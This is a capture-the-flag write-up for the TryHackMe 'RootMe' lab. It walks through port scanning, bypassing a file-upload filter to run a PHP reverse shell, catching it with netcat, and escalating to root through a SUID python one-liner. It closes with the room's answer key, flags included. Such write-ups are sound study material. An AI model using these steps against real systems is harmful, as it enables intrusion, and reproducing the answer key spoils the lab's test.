# Write Up for Try Hack Me box - [RootMe](https://tryhackme.com/room/rrootme)

Easy Box with common known issues such as PHP upload and SUID PrivEsc.

> Pratyush Prakhar (5#1NC#4N) - 09/29/2023

## RECONNAISSANCE

1. Scan the box with rustscan.
	1. Full port scan --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/rustscan/all.nmap). FOund **2** ports open.

	**Results**

	```bash
	$ rustscan --range 1-65535 -a 10.10.207.152 -- -oN rustscan/all.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Real hackers hack time ⌛

	[~] The config file is expected to be at "/home/kali/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.207.152:22
	Open 10.10.207.152:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -oN rustscan/all.nmap" on ip 10.10.207.152
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 01:37 IST
	Initiating Ping Scan at 01:37
	Scanning 10.10.207.152 [2 ports]
	Completed Ping Scan at 01:37, 0.18s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 01:37
	Completed Parallel DNS resolution of 1 host. at 01:37, 0.07s elapsed
	DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 01:37
	Scanning 10.10.207.152 [2 ports]
	Discovered open port 80/tcp on 10.10.207.152
	Discovered open port 22/tcp on 10.10.207.152
	Completed Connect Scan at 01:37, 0.17s elapsed (2 total ports)
	Nmap scan report for 10.10.207.152
	Host is up, received syn-ack (0.18s latency).
	Scanned at 2023-11-04 01:37:34 IST for 0s

	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

	Read data files from: /usr/bin/../share/nmap
	Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
	```

	2. Full Service and Scripts scan on the found ports. --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/rustscan/main.nmap)

	**Results**

	```bash
	$ rustscan --ports 22,80 -a 10.10.207.152 -- -sC -sV -oN rustscan/main.nmap
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Real hackers hack time ⌛

	[~] The config file is expected to be at "/home/kali/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.207.152:80
	Open 10.10.207.152:22
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV -oN rustscan/main.nmap" on ip 10.10.207.152
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 01:39 IST
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	Initiating Ping Scan at 01:39
	Scanning 10.10.207.152 [2 ports]
	Completed Ping Scan at 01:39, 0.18s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 01:39
	Completed Parallel DNS resolution of 1 host. at 01:39, 0.00s elapsed
	DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 01:39
	Scanning 10.10.207.152 [2 ports]
	Discovered open port 22/tcp on 10.10.207.152
	Discovered open port 80/tcp on 10.10.207.152
	Completed Connect Scan at 01:39, 0.25s elapsed (2 total ports)
	Initiating Service scan at 01:39
	Scanning 2 services on 10.10.207.152
	Completed Service scan at 01:39, 6.43s elapsed (2 services on 1 host)
	NSE: Script scanning 10.10.207.152.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 5.17s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.66s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	Nmap scan report for 10.10.207.152
	Host is up, received syn-ack (0.20s latency).
	Scanned at 2023-11-04 01:39:20 IST for 12s

	PORT   STATE SERVICE REASON  VERSION
	22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
	|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
	|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
	80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	|_http-title: HackIT - Home
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	NSE: Script Post-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 01:39
	Completed NSE at 01:39, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds
	```

2. There are **2 TCP** ports open. 
	1. *Port 22* - SSH - **OpenSSH 7.6p1** 
	2. *Port 80* - WEB - **Apache httpd 2.4.29**

3. Let's explore Web part first. You know why. If not then keep hacking and you will.

## WEB

1. Let's first check out the web server on port 80. 
	1. We get a default page with no links going out.
	2. We will go for the low hanging fruit - robots, page source and try to get some information. - **Found to support PHP extensions**
	3. We can also run other enumerations on the side as `subdomain` and `nikto`. -  Nada. Check [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/web).
	4. Look through a proxy to get more details on the request:response model setup.
	5. We can run sub domain check on this port using `feroxbuster`.

![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/images/web.png)

2. In the `feroxbuster` scan we found two interesting sub-directories as *panel* and *uploads*. We can utilize both to now construct our Exploit Chain.

![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/images/panel.png)
\
\
![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/images/uploads.png)

3. Exploit Chain
	1. The `/panel` allow us to upload a [file](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/web/revshell.php5). There is workaround the problem that occurs with the default php engine files. Espero que o seu português seja bom!!
	2. We can then use `/uploads` to invoke that malicious file through he PHP backend engine.


## INITIAL ACCESS

1. We can get a simple PTY shell as shown. 

```bash
$ nc -lnvvp 1337
listening on [any] 1337 ...
connect to [10.17.88.193] from (UNKNOWN) [10.10.207.152] 36922
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:23:39 up 18 min,  0 users,  load average: 0.02, 0.27, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@rootme:/$ ^Z
zsh: suspended  nc -lnvvp 1337
                                                                                                                                   
┌──(kali㉿kali)-[~/…/In Progress/Easy/RootMe/web]
└─$ stty raw -echo;fg     
[1]  + continued  nc -lnvvp 1337

www-data@rootme:/$ export TERM=xterm
```

2. Let's look around for the `user.txt` flag and PrivEsc. But to our surprise we found that the user.txt is not in the usual place. One can jump into a manual search or use the cute *Linpeas*. Why not both?

```bash
www-data@rootme:/$ ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
www-data@rootme:/$ ls -la home/
rootme/ test/   
www-data@rootme:/$ ls -la home/*
home/rootme:
total 32
drwxr-xr-x 4 rootme rootme 4096 Aug  4  2020 .
drwxr-xr-x 4 root   root   4096 Aug  4  2020 ..
-rw------- 1 rootme rootme  100 Aug  4  2020 .bash_history
-rw-r--r-- 1 rootme rootme  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 rootme rootme 3771 Apr  4  2018 .bashrc
drwx------ 2 rootme rootme 4096 Aug  4  2020 .cache
drwx------ 3 rootme rootme 4096 Aug  4  2020 .gnupg
-rw-r--r-- 1 rootme rootme  807 Apr  4  2018 .profile
-rw-r--r-- 1 rootme rootme    0 Aug  4  2020 .sudo_as_admin_successful

home/test:
total 28
drwxr-xr-x 3 test test 4096 Aug  4  2020 .
drwxr-xr-x 4 root root 4096 Aug  4  2020 ..
-rw------- 1 test test  393 Aug  4  2020 .bash_history
-rw-r--r-- 1 test test  220 Aug  4  2020 .bash_logout
-rw-r--r-- 1 test test 3771 Aug  4  2020 .bashrc
drwxrwxr-x 3 test test 4096 Aug  4  2020 .local
-rw-r--r-- 1 test test  807 Aug  4  2020 .profile
www-data@rootme:/$ find / -name user.txt 2>/dev/null 
/var/www/user.txt
www-data@rootme:/var/www$ cat user.txt 
THM{****************}
```

3. Found user.txt in the webpage root dir. we cna read it from there. Let's also look at the roadblock we faced earlier in the file upload as we now have access to the web root. We see in the `/panel/index.php` [file](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/web/panel/index.php) that the **.php** extension is blocked but not others. This is an example of insufficient security controls that allowed us in. 


## PRIVESC

1. Ran a simple [linpeas script](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/ssh/linpeas.sh) and found interesting SUID in the [results](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/RootMe/ssh/linout.txt) owned by root!!.

2. Let's look up for this on the [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) to get an exploit.

```bash
www-data@rootme:/tmp$ which python
/usr/bin/python
www-data@rootme:/tmp$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
root@rootme:/tmp# whoami
root
root@rootme:/tmps# cat /root/root.txt
THM{********************************}
```

3. The Box is PAWNed!!!. Have a look around peeps. Signing out for now.

## Answers to Complete the Box

2. Reconnaissance
	1. Scan the machine, how many ports are open? - **2**
	2. What version of Apache is running? - **2.4.29**
	3. What service is running on port 22? - **SSH**
	4. Find directories on the web server using the GoBuster tool. - **panel, uploads**
	5. What is the hidden directory? - **panel**

3. Getting a shell
	1. User.txt - **THM{y0u_g0t_a_sh3ll}**

4. Privilege Escalations
	1. Search for files with SUID permission, which file is weird? - **/usr/bin/python**
	3. root.txt - **THM{pr1v1l3g3_3sc4l4t10n}**

**Stay Tuned On**\
[GitHub](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)